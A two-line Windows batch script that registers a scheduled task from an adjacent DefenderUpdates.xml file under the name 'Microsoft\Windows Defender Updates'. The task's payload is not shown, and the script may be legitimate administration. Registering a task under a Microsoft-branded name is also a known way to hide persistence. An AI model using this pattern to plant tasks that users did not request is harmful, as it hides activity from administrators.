@ECHO OFF
schtasks /create /xml "%~dp0DefenderUpdates.xml" /tn "Microsoft\Windows Defender Updates"